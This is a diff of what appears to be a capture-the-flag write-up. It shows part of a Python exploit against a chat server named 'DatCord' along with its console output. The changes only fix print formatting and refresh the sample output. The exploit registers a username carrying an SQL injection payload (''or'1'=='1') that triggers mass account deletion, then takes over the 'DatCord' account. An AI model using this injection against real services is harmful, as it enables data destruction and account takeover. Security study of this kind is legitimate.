@@ -50,7 +50,7 @@ print(f"[*] Connected to DatCord.\n[*] Server banner: {banner}\n\n[*] Encryption
 print("[*] Generating credentials for exploit:")
 uname = "".join(chr(random.randint(65,90)) for x in range(26)) + "'or'1'=='1" # Yep, I know. Textbook injection!
 passw = "".join(chr(random.randint(65,90)) for x in range(26))
-print(f"[*] Username: {uname}\n[*] Password {passw}\n")
+print(f"[*] Username: {uname}\n[*] Password: {passw}\n")
 
 s.send(session.encrypt(f"!register {uname} {passw}".encode()))
 
@@ -75,7 +75,7 @@ s.send(session.encrypt(f"!register DatCord {passw}".encode()))
 
 registered = s.recv(10240)
 # client_help_msg = s.recv(10240)
-print(f"[*] Successfully registered DatCord account with password {passw}.\n")
+print(f"[*] Successfully registered DatCord account with password '{passw}'.\n")
 print(f"[*] Exploit completed. Beginning communication with DatCord.")
 s.close()
 
@@ -99,21 +99,22 @@ while True:
         break
 ```
 Below is the exploit in action:
-```[*] Connected to DatCord.
+```
+[*] Connected to DatCord.
 [*] Server banner: DatCord Server v7.77
 
 [*] Encryption key b'E2gbL9cN6ZKIoAzRR7CpVzgiBEBFEBlNnnez-wnOKKI='
 
 [*] Generating credentials for exploit:
-[*] Username: ELLOCETENESVCNFDLBGKIMNCKA'or'1'=='1
-[*] Password TZPQOCHGIAADMZTBRFHWRBQTUM
+[*] Username: QTVQOCJPGBSJPITQWMLHJUDRFB'or'1'=='1
+[*] Password: KWKDPOUZIDHAKPSKYTDOGKRJKT
 
 [*] Successfully registered injection account. Conducting global account deletion.
 
 [*] Injection completed. Terminating connection.
 
 [*] Successfully reconnected to DatCord.
-[*] Successfully registered DatCord account with password TZPQOCHGIAADMZTBRFHWRBQTUM.
+[*] Successfully registered DatCord account with password 'KWKDPOUZIDHAKPSKYTDOGKRJKT'.
 
 [*] Exploit completed. Beginning communication with DatCord.
 [*] Enter your message:
